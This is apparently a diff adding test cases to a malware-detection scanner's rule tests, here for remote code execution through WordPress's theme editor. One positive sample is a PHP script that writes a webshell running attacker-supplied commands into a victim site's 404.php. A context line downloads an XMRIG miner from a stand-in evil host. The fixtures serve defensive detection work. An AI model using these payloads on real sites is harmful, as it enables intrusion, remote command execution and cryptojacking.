@@ -1118,6 +1118,24 @@ $out = shell_exec($cmd);`,
 			sample:   "#!/bin/sh\nWGET http://evil.test/XMRIG -O /tmp/.x\n",
 		},
 		{
+			name: "theme editor push",
+			rule: "wp_theme_editor_rce",
+			want: true,
+			sample: `<?php
+$payload = "<?php @system($_GET['c']); ?>";
+$fields = http_build_query(array('action' => 'update', 'theme' => 'twentytwenty', 'file' => '404.php', 'newcontent' => $payload));
+$ch = curl_init('https://victim.example.test/wp-admin/theme-editor.php');
+curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
+curl_exec($ch);`,
+		},
+		{
+			name: "theme editor screen reading its own field",
+			rule: "wp_theme_editor_rce",
+			sample: `<?php
+$content = wp_unslash($_POST['newcontent']);
+wp_redirect(admin_url('theme-editor.php?file=' . $file . '&updated=true'));`,
+		},
+		{
 			name: "phishing kit submitting through JavaScript",
 			rule: "phishing_sharepoint",
 			ext:  ".html",
